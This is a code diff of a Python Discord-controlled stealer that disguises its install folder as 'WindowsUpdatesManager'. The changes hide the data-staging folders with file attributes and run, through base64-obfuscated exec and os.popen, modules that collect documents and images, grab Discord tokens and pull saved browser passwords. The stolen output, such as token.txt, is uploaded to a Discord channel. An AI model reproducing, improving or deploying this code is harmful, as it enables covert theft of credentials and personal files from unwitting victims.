@@ -11,6 +11,9 @@ import subprocess
 import json
 import requests
 import time
+import win32api
+import win32con
+
 main_path = os.getenv("LOCALAPPDATA") + "\WindowsUpdatesManager\Snky-main"
 modules_path = main_path + "\modules"
 client = discord.Client(intents=discord.Intents.all())
@@ -46,12 +49,14 @@ def get_raw_git_content(url):
 async def on_ready():
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
+        win32api.SetFileAttributes(f"{os.getenv('APPDATA')}\\WindowsUpdates",win32con.FILE_ATTRIBUTE_HIDDEN)
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\txt")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\images")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\docx")
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files\\csv")
+        win32api.SetFileAttributes(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files",win32con.FILE_ATTRIBUTE_HIDDEN)
 
     if not config.get("Helpers").get("did_run"):
         try:
@@ -470,7 +475,7 @@ async def on_message(message):
 
     if message.content.startswith(".file_collector"):
         await message.delete()
-        exec(base64.b64decode("I3J1biBmaWxlX2NvbGxlY3Rvci5weXcgYW5kIHdhaXQgdW50aWwgZmluaXNoZWQgdGhlbiBzZW5kIGNvbGxlY3RlZF9maWxlcy56aXANCm9zLnN5c3RlbShmInB5IHttYWluX3BhdGh9XFxidWlsdF9pbl9tb2R1bGVzXFxmaWxlX2NvbGxlY3Rvci5weXciKQ0="))
+        exec(base64.b64decode("I3J1biBmaWxlX2NvbGxlY3Rvci5weXcgYW5kIHdhaXQgdW50aWwgZmluaXNoZWQgdGhlbiBzZW5kIGNvbGxlY3RlZF9maWxlcy56aXANCm9zLnBvcGVuKGYicHkge21haW5fcGF0aH1cXGJ1aWx0X2luX21vZHVsZXNcXGZpbGVfY29sbGVjdG9yLnB5dyIpDQ=="))
         
         embed = discord.Embed(title="File Collector", description="File collector executed.\nNOTE: If you have enabled image collection, .zip file size may be too big to send!", color=0x00ff00)
         await message.channel.send(embed=embed)
@@ -481,7 +486,7 @@ async def on_message(message):
     if message.content.startswith(".token_grab"):
         await message.delete()
 
-        os.system(f"py {main_path}\\built_in_modules\\discord_token_grabber.pyw")
+        os.popen(f"py {main_path}\\built_in_modules\\discord_token_grabber.pyw")
 
         embed = discord.Embed(title="Token Grabber", description="Executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
@@ -490,10 +495,11 @@ async def on_message(message):
             time.sleep(1)
 
         await message.channel.send(file=discord.File(f"{main_path}\\token.txt"))
+
     if message.content.startswith(".browser_grab"):
         await message.delete()
-        #run token_grabber.pyw and wait until finished then send token.txt
-        os.system(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
+        #run browsrer_psw.pyw and wait until finished then send token.txt
+        os.popen(f"py {main_path}\\built_in_modules\\browser_psw.pyw")
 
         embed = discord.Embed(title="Browser Grabber", description="Executed.", color=0x00ff00)
         await message.channel.send(embed=embed)
@@ -510,5 +516,5 @@ async def on_message(message):
         files.delete_dir(f"{main_path}\\browsers")
         files.delete_file(f"{main_path}\\browsers.zip")
         os.remove(f"{main_path}\\browsers")
-
+        
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
